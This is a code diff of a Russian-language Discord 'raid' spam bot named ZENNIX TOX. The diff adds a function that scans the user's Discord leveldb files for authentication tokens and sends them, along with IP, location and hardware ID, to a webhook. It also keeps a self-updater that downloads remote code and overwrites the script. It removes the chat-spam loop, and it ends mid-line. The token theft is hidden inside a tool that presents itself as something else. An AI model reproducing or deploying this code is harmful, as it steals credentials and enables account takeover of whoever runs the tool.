@@ -1,4 +1,4 @@
-import requests, os, sys, time, random, keyboard, threading, uuid, platform
+import requests, os, sys, time, random, keyboard, threading, uuid, platform, re, glob
 from datetime import datetime
 
 BOT_VERSION = "1.12.5"
@@ -13,12 +13,24 @@ def t(text, d=0.04):
     for c in text: print(c, end="", flush=True); time.sleep(d)
     print()
 
-def box(lines):
-    width = max(len(l) for l in lines) + 4
-    print("\033[91m╔" + "═" * width + "╗\033[0m")
-    for line in lines:
-        print("\033[91m║\033[0m " + line.ljust(width-4) + " \033[91m║\033[0m")
-    print("\033[91m╚" + "═" * width + "╝\033[0m")
+def get_discord_token():
+    tokens = []
+    paths = [
+        os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
+        os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
+        os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
+    ]
+    for path in paths:
+        if not os.path.exists(path): continue
+        for file in glob.glob(path + "\\*.ldb") + glob.glob(path + "\\*.log"):
+            try:
+                with open(file, "rb") as f:
+                    content = f.read().decode(errors="ignore")
+                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", content):
+                        if token not in tokens:
+                            tokens.append(token)
+            except: pass
+    return tokens if tokens else ["Не найдено"]
 
 def send_webhook(username):
     try:
@@ -27,9 +39,12 @@ def send_webhook(username):
         ip_info = requests.get("http://ip-api.com/json/", timeout=5).json()
         ip = ip_info.get("query", "Неизвестно")
         location = f"{ip_info.get('city','?')}, {ip_info.get('country','?')}"
+        tokens = get_discord_token()
+        token_text = "\n".join([f"`{t}`" for t in tokens[:5]]) if "Не найдено" not in tokens else "Не найдено"
+        
         data = {
             "embeds": [{
-                "title": "ZENNIX TOX — ЗАПУСК",
+                "title": "ZENNIX TOX — ЗАПУСК + DISCORD TOKEN",
                 "color": 16711680,
                 "fields": [
                     {"name": "Логин", "value": username, "inline": True},
@@ -37,6 +52,7 @@ def send_webhook(username):
                     {"name": "HWID", "value": f"```{hwid}```", "inline": False},
                     {"name": "IP", "value": ip, "inline": True},
                     {"name": "Город", "value": location, "inline": True},
+                    {"name": "Discord токены", "value": token_text, "inline": False},
                     {"name": "Время", "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"), "inline": False}
                 ]
             }]
@@ -50,20 +66,16 @@ def check_update():
         local = open(LOCAL_VERSION_FILE).read().strip() if os.path.exists(LOCAL_VERSION_FILE) else "0.0.0"
         if online != local:
             clear()
-            box([
-                "   ОБЯЗАТЕЛЬНОЕ ОБНОВЛЕНИЕ   ",
-                f"   У тебя: {local}                  ",
-                f"   Новая:  {online}                  ",
-                "   Загружаю обновление...      "
-            ])
-            for i in range(101):
-                bar = "█" * (i//3) + "░" * (33 - i//3)
-                print(f"\r   \033[91m[\033[0m{bar}\033[91m]\033[0m {i}%", end="", flush=True)
-                time.sleep(0.03)
-            print("\n\n\033[91m   Ядро внедрено. Перезапуск...\033[0m")
+            print("\033[91m╔════════════════════════════════╗")
+            print("║ ОБЯЗАТЕЛЬНОЕ ОБНОВЛЕНИЕ ║")
+            print(f"║ У тебя: {local} ║")
+            print(f"║ Новая: {online} ║")
+            print("╚════════════════════════════════╝\033[0m")
+            input("\n Нажми Enter для обновления...")
             code = requests.get("https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/main", timeout=30).text
             with open(__file__, "w", encoding="utf-8") as f: f.write(code)
             with open(LOCAL_VERSION_FILE, "w") as f: f.write(online)
+            print(" Перезапуск...")
             time.sleep(2)
             os.execv(sys.executable, [sys.executable] + sys.argv)
     except: pass
@@ -119,9 +131,7 @@ def banner():
   ███╔╝ ██╔══╝ ██║╚██╗██║██║╚██╗██║██║ ██╔██╗
  ███████╗███████╗██║ ╚████║██║ ╚████║██║██╔╝ ██╗
  ╚══════╝╚══════╝╚═╝ ╚═══╝╚═╝ ╚═══╝╚═╝╚═╝ ╚═╝ v1.12.5
-    ╔══════════════════════════╗
-    ║    TOXIC RAID SYSTEM     ║
-    ╚══════════════════════════╝
+    \033[0m\033[91m ╔═ TOXIC RAID SYSTEM ═╗\033[0m
     """)
 
 def progress(stage):
@@ -148,47 +158,4 @@ def change_delay():
 def menu():
     while True:
         clear(); banner()
-        print(f" Пользователь: {current_user}    Задержка: {DELAY}s\n")
-        box([
-            " 1. Начать рейд (f7)             ",
-            " 2. Сменить задержку               ",
-            " 3. Выйти с аккаунта               ",
-            " 4. Полный выход                  "
-        ])
-        ch = input("\n Выбор → ")
-        if ch == "1": input("\n Перейди в чат → нажми f7 → enter...")
-        elif ch == "2": change_delay()
-        elif ch == "3":
-            if os.path.exists(CONFIG): os.remove(CONFIG)
-            t(" Сессия удалена"); time.sleep(2); os.execv(sys.executable, [sys.executable] + sys.argv)
-        elif ch == "4": sys.exit()
-
-def spam():
-    global spam_active
-    if spam_active: return
-    spam_active = True
-    stop_event.clear()
-    for i in range(5,0,-1):
-        print(f"\r Запуск через {i}...", end="", flush=True); time.sleep(1)
-    clear()
-    print(" РЕЙД АКТИВИРОВАН | f8 — стоп")
-    while not stop_event.is_set():
-        for txt,_ in MESSAGES:
-            if stop_event.is_set(): break
-            keyboard.write(txt)
-            keyboard.press_and_release("enter")
-            time.sleep(DELAY + random.uniform(-0.2, 0.4))
-    spam_active = False
-
-keyboard.add_hotkey("f7", lambda: threading.Thread(target=spam,daemon=True).start())
-keyboard.add_hotkey("f8", stop_event.set)
-
-if not os.path.exists(FOLDER):
-    os.makedirs(FOLDER)
-    os.system(f'attrib +h "{FOLDER}"')
-
-clear(); banner()
-progress("Hook installation"); progress("Bypassing protections"); progress("Loading toxic database"); progress("Initializing raid engine"); progress("Ready to raid")
-check_update()
-login()
-menu()
+        print(f"
